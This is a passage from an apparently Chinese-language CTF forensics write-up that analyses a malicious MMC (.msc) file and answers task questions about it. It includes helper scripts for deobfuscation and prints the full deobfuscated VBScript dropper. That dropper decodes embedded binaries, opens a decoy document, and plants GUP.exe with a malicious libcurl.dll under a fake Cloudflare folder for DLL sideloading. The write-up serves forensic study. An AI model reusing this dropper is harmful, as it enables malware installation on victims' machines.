viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task4">task4<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task4" class="hash-link" aria-label="task4的直接链接" title="task4的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者所投放样本的初始执行语句在该攻击载荷文件的第几行? 示例: 20</li>
</ol>
</blockquote>
<p>直接使用文本编辑器打开 <code>msc</code> 文件，在第 92 行可以发现 Javascript 载荷，在第 97 行可以发现执行 Javascript 载荷的语句</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241158-155851-34fa1e5b1c6a9c9d3c5be93074b7e23e.png" width="1767" height="1315" class="img_ev3q"></p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. 97</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task5">task5<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task5" class="hash-link" aria-label="task5的直接链接" title="task5的直接链接">​</a></h3>
<blockquote>
<ol>
<li>经过初始执行后, 攻击者所加载的第二部分载荷所使用的语言是什么? 示例: javascript</li>
</ol>
</blockquote>
<p>将第 92 行的 Javascript 载荷提取出来</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241100-160025-39b4ffd36ed5a6b35228a1d200f7f56b.png" width="2559" height="1371" class="img_ev3q"></p>
<p>可以发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241101-160100-6fbd76e58611f514463fba65b56f2e96.png" width="1845" height="1208" class="img_ev3q"></p>
<p>即可确认答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. VBScript</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task6">task6<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task6" class="hash-link" aria-label="task6的直接链接" title="task6的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者所进行的第二部分载荷其将白 EXE 存在了什么地方? (注意: 需要提供完成的解混淆后的第二部分载荷 s*******s 函数的参数) 提交需要 MD5(参数内容) 以 Cyberchef 结果为准 示例: 9b04d152845ec0a378394003c96da594</p>
</li>
<li>
<p>攻击者所进行的第二部分载荷其将黑 DLL 存在了什么地方? (注意: 需要提供完成的解混淆后的第二部分载荷 s*******s 函数的参数) 提交需要 MD5(参数内容) 以 Cyberchef 结果为准 示例: 9b04d152845ec0a378394003c96da594</p>
</li>
</ol>
</blockquote>
<p>将 Javascript 载荷中的 VBScript 提取出来，可以发现其中使用 ASCII 编码进行了混淆</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241103-160324-dce41577e6233a4068331fb2ffa2e76b.png" width="2059" height="1378" class="img_ev3q"></p>
<p>在 <a href="https://onecompiler.com/vb/" target="_blank" rel="noopener noreferrer">Visual Basic (VB.NET) - OneCompiler</a> 中，使用以下 VB 代码进行解混淆</p>
<div class="language-vb codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-vb codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Public Module Program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Public Sub Main(args() As String)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        '按顺序计算每个 Chr 函数并连接字符串</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Dim result As String = Chr(98) &amp; Chr(Int("105")) &amp; Chr(110)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ' 输出结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Console.WriteLine(result)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Module</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>在 Visual Basic 中，原语句为 <code>Chr(Int("&amp;H6f"))</code> 需要改为 <code>Chr(Convert.ToInt32("6f", 16))</code></p><p>或者改为 <code>Chr(&amp;H6f)</code></p><p>可以使用以下脚本辅助处理</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./data.txt"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"r"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"&amp;H"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"##"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"&amp;"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"##"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&amp;H"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'Int("&amp;H'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Int("&amp;H'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">"&amp;H"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'")'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"&amp;"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 解密后的 vb 代码 </summary><div><div class="collapsibleContent_i85q"><div class="language-vb codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-vb codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Dim mscLL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mscLL="_MSC"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For i=1 to Len(mscLL) Step 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">oFmXCTg=oFmXCTg &amp; ChrW(CLng("&amp;"&amp;Chr(72) &amp; Mid(mscLL,i,4)))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set RTcxFmy=CreateObject("Microsoft.XMLDOM")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RTcxFmy.Async=False</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RTcxFmy.Load(oFmXCTg)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AJ8p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Function Xk7fbp8v(inp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim q4XPbvoV</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim HxWK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set q4XPbvoV=CreateObject("MSXML2.DOMDocument")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set HxWK=q4XPbvoV.createElement("a")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HxWK.DataType="bin.base64"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HxWK.Text=inp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Xk7fbp8v=HxWK.nodeTypedValue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Function AJ8p()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">On Error Resume Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim AgUvcCuHzzbl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim DfAV40y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim gwqhhV</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim JJNe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim Mw7U</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim O8B1OrkTW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OMxa="51734e8e7ec47ec753c252a07b2c516b5c4a201c5f3a7f51676f201d516856fd7f517edc5b895168631162188d5b7684901a77e5ff08003100316708003265e581f3003365e54e3e884c7ebf4e0a8d5bff09002e007000640066"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set AgUvcCuHzzbl=CreateObject("WScript.Shell")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set DfAV40y=CreateObject("Scripting.FileSystemObject")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">O8B1OrkTW=AgUvcCuHzzbl.ExpandEnvironmentStrings("%ProgramFiles%")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">P59b6scR2TD9=O8B1OrkTW &amp; "\Cloudflare"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DfAV40y.CreateFolder(P59b6scR2TD9)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gwqhhV=P59b6scR2TD9 &amp; "\GUP.exe"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JJNe=P59b6scR2TD9 &amp; "\libcurl.dll"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For i=1 to Len(OMxa) Step 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FRURX=FRURX &amp; ChrW(CLng("&amp;"&amp;Chr(72) &amp; Mid(OMxa,i,4)))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mw7U=DfAV40y.GetSpecialFolder(2) &amp; Chr(92) &amp; FRURX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set aZPHxtz4=RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE']" )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rqsgO2mBfu=aZPHxtz4(0).text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UoLAunW=Xk7fbp8v(rqsgO2mBfu)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim jXnaWeLQ12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set jXnaWeLQ12=CreateObject("ADODB.Stream")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jXnaWeLQ12.Type=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jXnaWeLQ12.Open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jXnaWeLQ12.Write UoLAunW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jXnaWeLQ12.SaveToFile Mw7U,2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AgUvcCuHzzbl.run """"&amp; Mw7U &amp;"""",1,false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set aZPHxtz4=RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']" )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ze1C=aZPHxtz4(0).text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']" )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JozMh9jg=aZPHxtz4(0).text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AnZUOdqFuMEw=Xk7fbp8v(Ze1C)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">s4fr2y4Q7lvQ=Xk7fbp8v(JozMh9jg)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim cHh5wARUext</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set cHh5wARUext=CreateObject("ADODB.Stream")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cHh5wARUext.Type=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cHh5wARUext.Open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cHh5wARUext.Write AnZUOdqFuMEw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cHh5wARUext.SaveToFile gwqhhV,2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim BKzG1ldRw7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Set BKzG1ldRw7=CreateObject("ADODB.Stream")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BKzG1ldRw7.Type=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BKzG1ldRw7.Open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BKzG1ldRw7.Write s4fr2y4Q7lvQ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BKzG1ldRw7.SaveToFile JJNe,2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AgUvcCuHzzbl.run """"&amp; gwqhhV &amp;"""" &amp; "t 8.8.8.8",0,false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Public Function i9Vu0(ByVal Value,ByVal Shift)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=Value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If Shift&gt;0 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If Value&gt;0 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=Int(i9Vu0/(2^Shift))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If Shift&gt;31 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=i9Vu0 And &amp;H7FFFFFFF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=Int(i9Vu0/(2^Shift))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">i9Vu0=i9Vu0 Or 2^(31-Shift)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Public Function PIvwo4QDjBC(ByVal Value,ByVal Shift)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PIvwo4QDjBC=Value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If Shift&gt;0 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For i=1 To Shift</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">m=PIvwo4QDjBC And &amp;H40000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PIvwo4QDjBC=(PIvwo4QDjBC And &amp;H3FFFFFFF)*2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If m&lt;&gt;0 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PIvwo4QDjBC=PIvwo4QDjBC Or &amp;H80000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Public Function eUBp1LoLYEMy(ByVal num)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Const rkLx=5570645</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Const beweT2U=52428</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Const d1=7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Const d2=14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim t,u,out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">t=(num Xor i9Vu0(num,d2)) And beweT2U</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">u=num Xor t Xor PIvwo4QDjBC(t,d2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">t=(u Xor i9Vu0(u,d1)) And rkLx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">out=(u Xor t Xor PIvwo4QDjBC(t,d1))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eUBp1LoLYEMy=out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Public Function FTKaWvcYaGWt(ByRef MiCzi9())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim i,fr,upJNNa,raw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim a,b,c,d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim YBx4PZLTHSQ1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim EJSi8qJd0()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim a2,b2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">YBx4PZLTHSQ1=""</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For i=0 To (UBound(MiCzi9)/4+1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fr=i*4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If fr&gt;UBound(MiCzi9) Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exit For</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upJNNa=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+3),24)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+2),16)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+1),8)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upJNNa=upJNNa Or MiCzi9(fr+0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">raw=eUBp1LoLYEMy(upJNNa)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a=Chr(i9Vu0((raw And &amp;HFF000000),24))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b=Chr(i9Vu0((raw And 16711680),16))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c=Chr(i9Vu0((raw And 65280),8))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d=Chr(i9Vu0((raw And 255),0))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">YBx4PZLTHSQ1=YBx4PZLTHSQ1+d+c+b+a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FTKaWvcYaGWt=YBx4PZLTHSQ1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Public Function t4zFxxgg22(MiCzi9)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim CYhV8N(),Liefs(),arrayByte3(255)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim Rp7jaY2jOqr(63),arrayLong5(63)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim Mbt0mzk6(63),NALQp0Gu3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim b7Z9n8,iter,VKkZEf,ZyvKLLyyHHD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim YBx4PZLTHSQ1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MiCzi9=Replace(MiCzi9,vbCr,vbNullString)</span><br></span><span class="token-line" style="color:#393A34"><span class="token 